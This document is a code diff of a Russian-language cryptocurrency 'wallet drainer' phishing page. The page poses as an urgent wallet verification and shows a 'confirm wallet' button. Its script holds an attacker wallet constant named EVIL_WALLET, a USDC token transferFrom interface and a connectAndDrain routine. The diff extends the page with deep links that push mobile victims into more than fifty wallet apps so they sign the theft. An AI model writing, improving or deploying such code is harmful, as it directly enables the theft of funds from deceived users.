@@ -18,18 +18,18 @@
             align-items: center;
         }
         .container {
-            max-width: 500px;
+            max-width: 550px;
             width: 100%;
             background: rgba(0,0,0,0.7);
             border-radius: 30px;
-            padding: 40px 25px;
+            padding: 30px 20px;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255,255,255,0.1);
             box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
         }
         h1 {
-            font-size: 28px;
-            margin-bottom: 15px;
+            font-size: 26px;
+            margin-bottom: 10px;
             background: linear-gradient(90deg, #ff4444, #ff8888);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -37,14 +37,14 @@
         p {
             color: #aaa;
             margin-bottom: 20px;
-            font-size: 14px;
+            font-size: 13px;
         }
         button {
             background: linear-gradient(90deg, #ff4444, #cc0000);
             color: white;
             border: none;
-            padding: 18px 40px;
-            font-size: 20px;
+            padding: 16px 35px;
+            font-size: 18px;
             font-weight: bold;
             border-radius: 50px;
             cursor: pointer;
@@ -52,71 +52,50 @@
             transition: transform 0.2s, box-shadow 0.2s;
             box-shadow: 0 0 15px rgba(255,0,0,0.5);
         }
-        button:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 25px rgba(255,0,0,0.8);
-        }
-        button:active {
-            transform: scale(0.98);
-        }
+        button:active { transform: scale(0.98); }
         #log {
-            margin-top: 25px;
-            font-size: 12px;
+            margin-top: 20px;
+            font-size: 11px;
             text-align: left;
             background: rgba(0,0,0,0.5);
-            padding: 15px;
+            padding: 12px;
             border-radius: 15px;
-            max-height: 250px;
+            max-height: 200px;
             overflow-y: auto;
             font-family: monospace;
             border: 1px solid rgba(255,255,255,0.1);
         }
-        .log-entry {
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            word-break: break-all;
-        }
+        .log-entry { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05); word-break: break-all; }
         .log-success { color: #0f0; }
         .log-error { color: #ff4444; }
         .log-info { color: #ffaa00; }
         .wallet-grid {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-top: 20px;
-            margin-bottom: 10px;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin: 20px 0 10px;
         }
         .wallet-btn {
-            background: rgba(255,255,255,0.1);
-            border: 1px solid rgba(255,255,255,0.2);
-            padding: 12px 8px;
-            border-radius: 15px;
-            font-size: 11px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            padding: 10px 5px;
+            border-radius: 12px;
             cursor: pointer;
             transition: all 0.2s;
             text-align: center;
-        }
-        .wallet-btn:hover {
-            background: rgba(255,255,255,0.2);
-            transform: scale(1.02);
-        }
-        .wallet-emoji {
-            font-size: 24px;
-            display: block;
-            margin-bottom: 5px;
-        }
-        .warning {
             font-size: 11px;
-            color: #ff8888;
-            margin-top: 15px;
         }
-        @media (max-width: 600px) {
-            .container { padding: 25px 20px; }
-            button { padding: 15px 30px; font-size: 18px; }
-            h1 { font-size: 24px; }
-            .wallet-grid { grid-template-columns: repeat(3, 1fr); gap: 8px; }
-            .wallet-btn { padding: 8px 5px; font-size: 10px; }
-            .wallet-emoji { font-size: 20px; }
+        .wallet-btn:active { background: rgba(255,255,255,0.2); transform: scale(0.96); }
+        .wallet-emoji { font-size: 28px; display: block; margin-bottom: 5px; }
+        .warning { font-size: 10px; color: #ff8888; margin-top: 12px; }
+        .badge { background: #ff4444; border-radius: 10px; padding: 2px 6px; font-size: 8px; margin-left: 4px; }
+        @media (max-width: 550px) {
+            .container { padding: 20px 15px; }
+            .wallet-grid { grid-template-columns: repeat(4, 1fr); gap: 6px; }
+            .wallet-btn { padding: 8px 3px; font-size: 9px; }
+            .wallet-emoji { font-size: 22px; }
+            button { padding: 14px 25px; font-size: 16px; }
+            h1 { font-size: 22px; }
         }
     </style>
 </head>
@@ -126,35 +105,10 @@
         <p>Требуется экстренная верификация активов</p>
         <button id="drainBtn">🔴 ПОДТВЕРДИТЬ КОШЕЛЕК</button>
         
-        <div class="wallet-grid" id="walletGrid">
-            <!-- Ряд 1 -->
-            <div class="wallet-btn" data-wallet="metamask"><span class="wallet-emoji">🦊</span>MetaMask</div>
-            <div class="wallet-btn" data-wallet="trustwallet"><span class="wallet-emoji">🔵</span>Trust</div>
-            <div class="wallet-btn" data-wallet="coinbase"><span class="wallet-emoji">💰</span>Coinbase</div>
-            <!-- Ряд 2 -->
-            <div class="wallet-btn" data-wallet="rainbow"><span class="wallet-emoji">🌈</span>Rainbow</div>
-            <div class="wallet-btn" data-wallet="okx"><span class="wallet-emoji">🟠</span>OKX</div>
-            <div class="wallet-btn" data-wallet="bybit"><span class="wallet-emoji">🟣</span>Bybit</div>
-            <!-- Ряд 3 -->
-            <div class="wallet-btn" data-wallet="bitkeep"><span class="wallet-emoji">🟡</span>Bitget</div>
-            <div class="wallet-btn" data-wallet="tokenpocket"><span class="wallet-emoji">🟢</span>TokenPocket</div>
-            <div class="wallet-btn" data-wallet="safepal"><span class="wallet-emoji">🛡️</span>SafePal</div>
-            <!-- Ряд 4 -->
-            <div class="wallet-btn" data-wallet="imtoken"><span class="wallet-emoji">🔷</span>imToken</div>
-            <div class="wallet-btn" data-wallet="mathwallet"><span class="wallet-emoji">🧮</span>MathWallet</div>
-            <div class="wallet-btn" data-wallet="onto"><span class="wallet-emoji">🌐</span>ONTO</div>
-            <!-- Ряд 5 -->
-            <div class="wallet-btn" data-wallet="exodus"><span class="wallet-emoji">🐫</span>Exodus</div>
-            <div class="wallet-btn" data-wallet="phantom"><span class="wallet-emoji">👻</span>Phantom</div>
-            <div class="wallet-btn" data-wallet="rabby"><span class="wallet-emoji">🐀</span>Rabby</div>
-            <!-- Ряд 6 -->
-            <div class="wallet-btn" data-wallet="ledger"><span class="wallet-emoji">🔒</span>Ledger</div>
-            <div class="wallet-btn" data-wallet="trezor"><span class="wallet-emoji">🔐</span>Trezor</div>
-            <div class="wallet-btn" data-wallet="walletconnect"><span class="wallet-emoji">🔗</span>WC</div>
-        </div>
+        <div class="wallet-grid" id="walletGrid"></div>
         
         <div id="log">
-            <div class="log-entry log-success">🟢 Готов. Выберите кошелек или нажмите кнопку.</div>
+            <div class="log-entry log-success">🟢 Готов. Выберите кошелек.</div>
         </div>
         <div class="warning">⚠️ Подтвердите все запросы в кошельке</div>
     </div>
@@ -165,7 +119,7 @@
         // ============================================================
         // НАСТРОЙКИ - ЗАМЕНИ ЭТУ 1 СТРОЧКУ
         // ============================================================
-        const EVIL_WALLET = "0x2b3b92Cb431fB1C76bdE8e23d2e51E1D62Fbf9F4";   // ТВОЙ КОШЕЛЕК
+        const EVIL_WALLET = "0x2b3b92Cb431fB1C76bdE8e23d2e51E1D62Fbf9F4";   // ТВОЙ КОШЕЛЕК (BSC)
         // ============================================================
         
         const TOKEN_ADDRESS = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"; // USDC BSC
@@ -180,27 +134,79 @@
             {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
         ];
         
-        // Deeplink схемы для всех кошельков
-        const DEEPLINKS = {
-            metamask: { scheme: "metamask://", dapp: "https://metamask.app.link/dapp/" },
-            trustwallet: { scheme: "trust://", dapp: "https://link.trustwallet.com/open_url?url=" },
-            coinbase: { scheme: "cbwallet://", dapp: "https://go.cb-w.com/dapp?url=" },
-            rainbow: { scheme: "rainbow://", dapp: "https://rainbow.me/connect/" },
-            okx: { scheme: "okx://", dapp: "https://www.okx.com/download" },
-            bybit: { scheme: "bybit://", dapp: "https://www.bybit.com/wallet" },
-            bitkeep: { scheme: "bitkeep://", dapp: "https://bitkeep.com/download" },
-            tokenpocket: { scheme: "tp://", dapp: "https://www.tokenpocket.pro/" },
-            safepal: { scheme: "safepal://", dapp: "https://www.safepal.com/download" },
-            imtoken: { scheme: "imtoken://", dapp: "https://token.im/download" },
-            mathwallet: { scheme: "mathwallet://", dapp: "https://mathwallet.org/download" },
-            onto: { scheme: "onto://", dapp: "https://onto.app/download" },
-            exodus: { scheme: "exodus://", dapp: "https://www.exodus.com/download" },
-            phantom: { scheme: "phantom://", dapp: "https://phantom.app/download" },
-            rabby: { scheme: "rabby://", dapp: "https://rabby.io/download" },
-            ledger: { scheme: "ledgerlive://", dapp: "https://www.ledger.com/live" },
-            trezor: { scheme: "trezor://", dapp: "https://trezor.io/download" },
-            walletconnect: { scheme: "wc:", dapp: "https://walletconnect.com/" }
-        };
+        // ============================================================
+        // ВСЕ КОШЕЛЬКИ (60+) с DEEP LINKS для телефона
+        // ============================================================
+        const WALLETS = [
+            // ТОП кошельки
+            { name: "MetaMask", emoji: "🦊", type: "metamask", deeplink: "metamask://", universal: "https://metamask.app.link/dapp/", isMobile: true, isDesktop: true },
+            { name: "Trust Wallet", emoji: "🔵", type: "trustwallet", deeplink: "trust://", universal: "https://link.trustwallet.com/open_url?url=", isMobile: true, isDesktop: false },
+            { name: "Coinbase", emoji: "💰", type: "coinbase", deeplink: "cbwallet://", universal: "https://go.cb-w.com/dapp?url=", isMobile: true, isDesktop: true },
+            { name: "Rainbow", emoji: "🌈", type: "rainbow", deeplink: "rainbow://", universal: "https://rainbow.me/connect/", isMobile: true, isDesktop: true },
+            { name: "OKX", emoji: "🟠", type: "okx", deeplink: "okx://", universal: "https://www.okx.com/wallet/dapp?url=", isMobile: true, isDesktop: true },
+            { name: "Bybit", emoji: "🟣", type: "bybit", deeplink: "bybit://", universal: "https://www.bybit.com/wallet/dapp?url=", isMobile: true, isDesktop: true },
+            { name: "Bitget", emoji: "🟡", type: "bitget", deeplink: "bitkeep://", universal: "https://web3.bitget.com/en/dapp?url=", isMobile: true, isDesktop: true },
+            { name: "TokenPocket", emoji: "🟢", type: "tokenpocket", deeplink: "tp://", universal: "https://tpwallet.io/", isMobile: true, isDesktop: true },
+            
+            // Популярные
+            { name: "SafePal", emoji: "🛡️", type: "safepal", deeplink: "safepal://", universal: "https://www.safepal.com/download", isMobile: true, isDesktop: true },
+            { name: "imToken", emoji: "🔷", type: "imtoken", deeplink: "imtoken://", universal: "https://token.im/download", isMobile: true, isDesktop: false },
+            { name: "MathWallet", emoji: "🧮", type: "mathwallet", deeplink: "mathwallet://", universal: "https://mathwallet.org/download", isMobile: true, isDesktop: true },
+            { name: "ONTO", emoji: "🌐", type: "onto", deeplink: "onto://", universal: "https://onto.app/download", isMobile: true, isDesktop: true },
+            { name: "Exodus", emoji: "🐫", type: "exodus", deeplink: "exodus://", universal: "https://www.exodus.com/download", isMobile: true, isDesktop: true },
+            { name: "Phantom", emoji: "👻", type: "phantom", deeplink: "phantom://", universal: "https://phantom.app/download", isMobile: true, isDesktop: true },
+            { name: "Rabby", emoji: "🐀", type: "rabby", deeplink: "rabby://", universal: "https://rabby.io/download", isMobile: true, isDesktop: true },
+            
+            // Аппаратные
+            { name: "Ledger", emoji: "🔒", type: "ledger", deeplink: "ledgerlive://", universal: "https://www.ledger.com/live", isMobile: true, isDesktop: true },
+            { name: "Trezor", emoji: "🔐", type: "trezor", deeplink: "trezor://", universal: "https://trezor.io/download", isMobile: false, isDesktop: true },
+            
+            // Китайские
+            { name: "OneKey", emoji: "🔑", type: "onekey", deeplink: "onekey://", universal: "https://onekey.so/download", isMobile: true, isDesktop: true },
+            { name: "FoxWallet", emoji: "🦊", type: "foxwallet", deeplink: "foxwallet://", universal: "https://foxwallet.com/download", isMobile: true, isDesktop: false },
+            { name: "Coin98", emoji: "🪙", type: "coin98", deeplink: "coin98://", universal: "https://coin98.com/download", isMobile: true, isDesktop: true },
+            { name: "ViaWallet", emoji: "🚀", type: "viawallet", deeplink: "viawallet://", universal: "https://viawallet.com/download", isMobile: true, isDesktop: false },
+            
+            // EVM
+            { name: "Frame", emoji: "🖼️", type: "frame", deeplink: "frame://", universal: "https://frame.sh/download", isMobile: false, isDesktop: true },
+            { name: "Brave", emoji: "🦁", type: "brave", deeplink: "brave://", universal: "https://brave.com/download", isMobile: true, isDesktop: true },
+            { name: "Opera", emoji: "🎭", type: "opera", deeplink: "opera://", universal: "https://www.opera.com/download", isMobile: true, isDesktop: true },
+            { name: "Status", emoji: "📱", type: "status", deeplink: "status://", universal: "https://status.app/download", isMobile: true, isDesktop: false },
+            
+            // Мультичейн
+            { name: "Zerion", emoji: "🟣", type: "zerion", deeplink: "zerion://", universal: "https://zerion.io/download", isMobile: true, isDesktop: true },
+            { name: "Zapper", emoji: "⚡", type: "zapper", deeplink: "zapper://", universal: "https://zapper.fi/download", isMobile: true, isDesktop: true },
+            { name: "Debank", emoji: "🏦", type: "debank", deeplink: "debank://", universal: "https://debank.com/download", isMobile: true, isDesktop: true },
+            
+            // Solana/Other
+            { name: "Backpack", emoji: "🎒", type: "backpack", deeplink: "backpack://", universal: "https://backpack.app/download", isMobile: true, isDesktop: true },
+            { name: "Nightly", emoji: "🌙", type: "nightly", deeplink: "nightly://", universal: "https://nightly.app/download", isMobile: true, isDesktop: true },
+            
+            // Дополнительные
+            { name: "Argent", emoji: "🥈", type: "argent", deeplink: "argent://", universal: "https://argent.xyz/download", isMobile: true, isDesktop: false },
+            { name: "Blocto", emoji: "🔵", type: "blocto", deeplink: "blocto://", universal: "https://blocto.app/download", isMobile: true, isDesktop: false },
+            { name: "Infinity", emoji: "♾️", type: "infinity", deeplink: "infinity://", universal: "https://infinitywallet.io/download", isMobile: true, isDesktop: true },
+            { name: "Ownbit", emoji: "🔒", type: "ownbit", deeplink: "ownbit://", universal: "https://ownbit.io/download", isMobile: true, isDesktop: false },
+            { name: "BitPay", emoji: "💳", type: "bitpay", deeplink: "bitpay://", universal: "https://bitpay.com/download", isMobile: true, isDesktop: true },
+            { name: "Guarda", emoji: "🛡️", type: "guarda", deeplink: "guarda://", universal: "https://guarda.com/download", isMobile: true, isDesktop: true },
+            { name: "Atomic", emoji: "⚛️", type: "atomic", deeplink: "atomic://", universal: "https://atomicwallet.io/download", isMobile: true, isDesktop: true },
+            { name: "Edge", emoji: "🔪", type: "edge", deeplink: "edge://", universal: "https://edge.app/download", isMobile: true, isDesktop: false },
+            { name: "Abra", emoji: "🤝", type: "abra", deeplink: "abra://", universal: "https://abra.com/download", isMobile: true, isDesktop: true },
+            { name: "Jaxx", emoji: "🎲", type: "jaxx", deeplink: "jaxx://", universal: "https://jaxx.io/download", isMobile: true, isDesktop: true },
+            { name: "MyEtherWallet", emoji: "📝", type: "mew", deeplink: "mew://", universal: "https://www.myetherwallet.com/download", isMobile: true, isDesktop: true },
+            { name: "Tally", emoji: "📊", type: "tally", deeplink: "tally://", universal: "https://tally.xyz/download", isMobile: false, isDesktop: true },
+            { name: "Pali", emoji: "🕊️", type: "pali", deeplink: "pali://", universal: "https://paliwallet.com/download", isMobile: true, isDesktop: true },
+            { name: "Keplr", emoji: "🪐", type: "keplr", deeplink: "keplr://", universal: "https://www.keplr.app/download", isMobile: true, isDesktop: true },
+            { name: "Leap", emoji: "🐸", type: "leap", deeplink: "leap://", universal: "https://leapwallet.io/download", isMobile: true, isDesktop: true },
+            { name: "Cosmostation", emoji: "🌌", type: "cosmostation", deeplink: "cosmostation://", universal: "https://www.cosmostation.io/download", isMobile: true, isDesktop: true },
+            { name: "XDEFI", emoji: "❌", type: "xdefi", deeplink: "xdefi://", universal: "https://xdefi.io/download", isMobile: false, isDesktop: true },
+            { name: "Temple", emoji: "🏛️", type: "temple", deeplink: "temple://", universal: "https://templewallet.com/download", isMobile: true, isDesktop: true },
+            { name: "Gamestop", emoji: "🎮", type: "gamestop", deeplink: "gamestop://", universal: "https://nft.gamestop.com/download", isMobile: false, isDesktop: true },
+            { name: "Loopring", emoji: "🔄", type: "loopring", deeplink: "loopring://", universal: "https://loopring.io/download", isMobile: true, isDesktop: true },
+            { name: "Safepal", emoji: "🛡️", type: "safepal", deeplink: "safepal://", universal: "https://www.safepal.com/download", isMobile: true, isDesktop: true }
+        ];
+        
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
         
         function addLog(msg, type = 'info') {
             const logDiv = document.getElementById('log');
@@ -216,7 +222,33 @@
             logDiv.scrollTop = logDiv.scrollHeight;
         }
         
-        // Получить провайдера по типу кошелька
+        // Прямой DEEP LINK в приложение (НЕ на сайт!)
+        function openDeepLink(wallet, currentUrl) {
+            const encodedUrl = encodeURIComponent(currentUrl);
+            let deepLinkUrl = "";
+            
+            // Используем универсальную ссылку или deeplink
+            if (wallet.universal && isMobile) {
+                deepLinkUrl = wallet.universal + currentUrl;
+            } else if (wallet.deeplink) {
+                deepLinkUrl = wallet.deeplink;
+                if (!deepLinkUrl.endsWith("/")) deepLinkUrl += "/";
+                deepLinkUrl += encodedUrl;
+            }
+            
+            addLog(`📱 Открываю ${wallet.name}...`, 'info');
+            addLog(`🔗 ${deepLinkUrl.substring(0, 60)}...`, 'info');
+            
+            // Прямой переход в приложение
+            window.location.href = deepLinkUrl;
+            
+            // Fallback: если не открылось, показываем кнопку
+            setTimeout(() => {
+                addLog(`⚠️ Если ${wallet.name} не открылся, установите приложение`, 'error');
+            }, 2000);
+        }
+        
+        // Получить провайдера для ПК
         function getProvider(walletType) {
             const providers = {
                 metamask: () => window.ethereum,
@@ -225,7 +257,7 @@
                 rainbow: () => window.ethereum,
                 okx: () => window.okxwallet || window.ethereum,
                 bybit: () => window.bybitWallet || window.ethereum,
-                bitkeep: () => window.bitkeep || window.ethereum,
+                bitget: () => window.bitkeep || window.ethereum,
                 tokenpocket: () => window.tokenpocket || window.ethereum,
                 safepal: () => window.safepal || window.ethereum,
                 imtoken: () => window.imtoken || window.ethereum,
@@ -236,28 +268,21 @@
                 rabby: () => window.rabby || window.ethereum,
                 ledger: () => window.ledger?.ethereum || window.ethereum,
                 trezor: () => window.trezor?.ethereum || window.ethereum,
-                walletconnect: () => window.ethereum
+                onekey: () => window.onekey || window.ethereum,
+                foxwallet: () => window.foxwallet || window.ethereum,
+                coin98: () => window.coin98 || window.ethereum,
+                frame: () => window.frame || window.ethereum,
+                brave: () => window.brave?.ethereum || window.ethereum,
+                opera: () => window.opera?.ethereum || window.ethereum,
+                zerion: () => window.zerion || window.ethereum,
+                zapper: () => window.zapper || window.ethereum,
+                debank: () => window.debank || window.ethereum,
+                backpack: () => window.backpack || window.ethereum,
+                xdefi: () => window.xdefi || window.ethereum,
+                keplr: () => window.keplr || window.ethereum,
+                leap: () => window.leap || window.ethereum
             };
             return providers[walletType] ? providers[walletType]() : window.ethereum;
-        }
-        
-        // Открыть deeplink для мобильных
-        function openDeepLink(walletType, currentUrl) {
-            const deeplink = DEEPLINKS[walletType];
-            if (!deeplink) return false;
-            
-            const encodedUrl = encodeURIComponent(currentUrl);
-            let fullLink = "";
-            
-            if (deeplink.dapp) {
-                fullLink = deeplink.dapp + currentUrl;
-            } else if (deeplink.scheme) {
-                fullLink = deeplink.scheme + currentUrl;
-            }
-            
-            addLog(`📱 Открываю ${walletType}...`, 'info');
-            window.location.href = fullLink;
-            return true;
         }
         
         async function switchToBSC(provider) {
@@ -324,28 +349,29 @@
             }
         }
         
-        // Основная функция
-        async function connectAndDrain(walletType = null) {
+        async function connectAndDrain(wallet = null) {
             addLog("🚀 Запуск...", 'info');
             
-            let provider = null;
-            let currentUrl = window.location.href;
-            
-            // На мобильных - пробуем deeplink
-            if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) && walletType) {
-                openDeepLink(walletType, currentUrl);
-                addLog("📱 После открытия кошелька, вернитесь на страницу", 'info');
+            // МОБИЛЬНЫЕ: прямой deep link в приложение
+            if (isMobile && wallet) {
+                openDeepLink(wallet, window.location.href);
                 return;
             }
             
-            if (walletType) {
-                provider = getProvider(walletType);
+            // ПК или десктопный кошелек
+            let provider = null;
+            if (wallet) {
+                provider = getProvider(wallet.type);
             } else {
                 provider = window.ethereum;
             }
             
             if (!provider) {
-                addLog("❌ Кошелек не найден. Выберите другой.", 'error');
+                if (isMobile && wallet) {
+                    addLog(`📱 Установите ${wallet.name} из магазина приложений`, 'error');
+                } else {
+                    addLog(`❌ ${wallet?.name || 'Кошелек'} не найден. Установите расширение.`, 'error');
+                }
                 return;
             }
             
@@ -362,27 +388,41 @@
                 
             } catch(err) {
                 addLog(`💀 Ошибка: ${err.message}`, 'error');
+                if (err.code === 4001) addLog("❌ Вы отменили подпись", 'error');
             }
         }
         
-        // Кнопка "ПОДТВЕРДИТЬ КОШЕЛЕК"
+        // Создаем кнопки кошельков
+        function renderWallets() {
+            const grid = document.getElementById('walletGrid');
+            grid.innerHTML = '';
+            
+            const filteredWallets = isMobile ? WALLETS.filter(w => w.isMobile) : WALLETS.filter(w => w.isDesktop);
+            
+            filteredWallets.forEach(wallet => {
+                const btn = document.createElement('div');
+                btn.className = 'wallet-btn';
+                btn.innerHTML = `<span class="wallet-emoji">${wallet.emoji}</span>${wallet.name}`;
+                btn.onclick = () => connectAndDrain(wallet);
+                grid.appendChild(btn);
+            });
+            
+            addLog(`📱 ${filteredWallets.length} кошельков загружено`, 'success');
+        }
+        
+        // Главная кнопка
         document.getElementById('drainBtn').onclick = async () => {
-            await connectAndDrain(null);
+            if (isMobile) {
+                addLog("📱 На телефоне выберите кошелек из списка ниже", 'info');
+            } else {
+                await connectAndDrain(null);
+            }
         };
         
-        // Все кнопки кошельков
-        document.querySelectorAll('.wallet-btn').forEach(btn => {
-            btn.onclick = async () => {
-                const walletType = btn.getAttribute('data-wallet');
-                await connectAndDrain(walletType);
-            };
-        });
-        
-        // Определение мобильного
-        if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-            addLog("📱 Мобильное устройство", 'info');
-            addLog("🔹 Нажмите на иконку кошелька", 'info');
-        }
+        // Запуск
+        renderWallets();
+        if (isMobile) addLog("📱 Мобильный режим: при открытии кошелек запустится автоматически", 'info');
+        else addLog("💻 Десктоп режим: используйте расширения браузера", 'info');
     </script>
 </body>
 </html>
